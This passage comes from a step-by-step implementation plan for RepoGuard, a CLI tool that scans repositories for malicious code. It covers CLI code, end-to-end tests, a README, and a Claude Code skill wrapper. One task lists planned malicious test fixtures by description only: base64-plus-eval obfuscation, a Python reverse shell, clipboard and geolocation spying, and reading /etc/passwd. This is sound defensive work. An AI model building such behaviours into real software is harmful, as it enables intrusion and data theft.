        const result = await scan(target, {
          mode: options.mode,
          ai: options.ai !== false && !!apiKey,
          apiKey,
          model: options.model,
        });

        // Terminal output
        console.log(renderTerminalReport(result));

        // PDF output
        const repoName = target.split('/').pop()?.replace('.git', '') || 'repo';
        const pdfPath = options.output || `./repoguard-report-${repoName}.pdf`;
        await generatePDF(result, pdfPath);
        console.log(`\nFull PDF report saved to: ${pdfPath}`);

        // Community submission
        if (options.submit) {
          console.log('\nCommunity submission is coming soon! Follow https://github.com/repoguard for updates.');
        }

        // Exit with non-zero if RED
        if (result.verdict === 'RED') process.exit(1);
      } catch (error) {
        console.error(`Error: ${error instanceof Error ? error.message : String(error)}`);
        process.exit(2);
      }
    });

  program
    .command('lookup <url>')
    .description('Check community ratings for a repository')
    .action((_url) => {
      console.log('Community lookup is coming soon! Follow https://github.com/repoguard for updates.');
    });

  program.parse();
}
```

- [ ] **Step 3: Create public API exports**

Create `src/index.ts`:
```typescript
export { scan } from './scanner.js';
export type { ScanResult, Finding, CategoryScore, RepoMetadata } from './rules/types.js';
export { RiskCategory, Severity, Verdict } from './rules/types.js';
```

- [ ] **Step 4: Build and test CLI manually**

```bash
npm run build
node dist/bin/repoguard.js scan tests/fixtures/malicious-repo --no-ai
```
Expected: Terminal output with RED verdict and findings

- [ ] **Step 5: Commit**

```bash
git add bin/ src/cli.ts src/index.ts
git commit -m "feat: implement CLI — scan and lookup commands with Commander"
```

---

## Chunk 8: Integration Testing & Polish

### Task 20: End-to-end integration tests

**Files:**
- Create: `tests/e2e/scan.test.ts`

- [ ] **Step 1: Write E2E tests**

Create `tests/e2e/scan.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { execSync } from 'node:child_process';
import { existsSync, unlinkSync } from 'node:fs';

describe('E2E: repoguard scan', () => {
  it('scans safe repo and exits 0', () => {
    const result = execSync(
      'node dist/bin/repoguard.js scan tests/fixtures/safe-repo --no-ai',
      { encoding: 'utf8' }
    );
    expect(result).toContain('GREEN');
  });

  it('scans malicious repo and exits 1', () => {
    try {
      execSync(
        'node dist/bin/repoguard.js scan tests/fixtures/malicious-repo --no-ai',
        { encoding: 'utf8' }
      );
      expect.fail('Should have exited with code 1');
    } catch (error: any) {
      expect(error.status).toBe(1);
      expect(error.stdout).toContain('RED');
    }
  });

  it('generates a PDF report', () => {
    const pdfPath = './test-report.pdf';
    try {
      execSync(
        `node dist/bin/repoguard.js scan tests/fixtures/safe-repo --no-ai --output ${pdfPath}`,
        { encoding: 'utf8' }
      );
      expect(existsSync(pdfPath)).toBe(true);
    } finally {
      if (existsSync(pdfPath)) unlinkSync(pdfPath);
    }
  });

  it('shows coming soon for --submit', () => {
    const result = execSync(
      'node dist/bin/repoguard.js scan tests/fixtures/safe-repo --no-ai --submit',
      { encoding: 'utf8' }
    );
    expect(result).toContain('coming soon');
  });

  it('shows coming soon for lookup', () => {
    const result = execSync(
      'node dist/bin/repoguard.js lookup https://github.com/test/repo',
      { encoding: 'utf8' }
    );
    expect(result).toContain('coming soon');
  });
});
```

- [ ] **Step 2: Build and run E2E tests**

```bash
npm run build && npx vitest run tests/e2e/
```
Expected: All PASS

- [ ] **Step 3: Commit**

```bash
git add tests/e2e/
git commit -m "test: add end-to-end integration tests for CLI"
```

---

### Task 21: Add more malicious test fixtures

**Files:**
- Create: `tests/fixtures/malicious-repo/obfuscated.js`
- Create: `tests/fixtures/malicious-repo/backdoor.py`
- Create: `tests/fixtures/edge-cases/empty/` (empty dir)
- Create: `tests/fixtures/edge-cases/binary-only/fake.exe`

- [ ] **Step 1: Add diverse malicious fixtures**

Add files that test each category:
- `obfuscated.js` — base64 + eval
- `backdoor.py` — reverse shell
- `privacy-spy.js` — clipboard + geolocation
- `traversal.js` — reads `/etc/passwd`

- [ ] **Step 2: Run full test suite**

```bash
npx vitest run
```
Expected: All tests PASS

- [ ] **Step 3: Commit**

```bash
git add tests/fixtures/
git commit -m "test: add comprehensive malicious and edge-case test fixtures"
```

---

### Task 22: README and npm publishing preparation

**Files:**
- Create: `README.md`

- [ ] **Step 1: Write README**

Include: what RepoGuard does, installation, usage (scan URL, scan local, modes), what it checks for (8 categories), output example, contributing.

- [ ] **Step 2: Verify package.json is publish-ready**

Check: name (unique on npm), version, description, license, repository, keywords, bin, files, engines.

- [ ] **Step 3: Final build and full test run**

```bash
npm run build && npx vitest run
```
Expected: Clean build, all tests PASS

- [ ] **Step 4: Commit**

```bash
git add README.md package.json
git commit -m "docs: add README with installation, usage, and security check categories"
```

---

## Chunk 9: Claude Code Skill (Phase 2)

### Task 23: Create Claude Code skill wrapper

**Files:**
- Create: `skill/repoguard.md`

- [ ] **Step 1: Write skill definition**

Create `skill/repoguard.md`:
```markdown
---
name: repoguard
description: Scan a GitHub repository or local directory for security risks, malicious code, data theft, and privacy violations. Use when a user wants to check if a repo is safe before using it.
---

# RepoGuard Security Scanner

Scan the target for security risks using the RepoGuard CLI.

## Usage
The user provides a GitHub URL or local path. Run:

\`\`\`bash
npx repoguard scan "<target>" --mode strict
\`\`\`

If the user has ANTHROPIC_API_KEY set, AI review will be included automatically.
If not, add `--no-ai` for static-only analysis.

Display the terminal output to the user. The PDF report is auto-saved.

If the user asks about a specific finding, explain it in plain English.
```

- [ ] **Step 2: Test skill locally in Claude Code**

Run `/repoguard https://github.com/some-test-repo` in Claude Code and verify it works.

- [ ] **Step 3: Commit**

```bash
git add skill/
git commit -m "feat: add Claude Code skill wrapper for RepoGuard"
```
